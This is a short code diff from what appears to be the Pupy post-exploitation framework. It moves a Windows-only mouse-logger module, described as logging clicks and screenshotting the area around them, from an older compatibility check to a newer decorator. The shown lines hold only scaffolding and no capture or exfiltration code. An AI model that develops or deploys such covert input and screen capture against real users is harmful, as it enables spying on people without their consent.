@@ -20,6 +20,7 @@ def pil_save(filename, pixels, width, height):
 
 __class_name__="MouseLoggerModule"
 
+@compatibility("windows")
 class MouseLoggerModule(PupyModule):
 	""" log mouse clicks and take screenshots of areas around it """
 	# WARNING : screenshots are kept in memory before beeing dumped
@@ -34,10 +35,6 @@ class MouseLoggerModule(PupyModule):
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog='mouselogger', description=self.__doc__)
 		self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
-
-	@windows_only
-	def is_compatible(self):
-		pass
 
 	def stop_daemon(self):
 		self.success("mouselogger stopped")
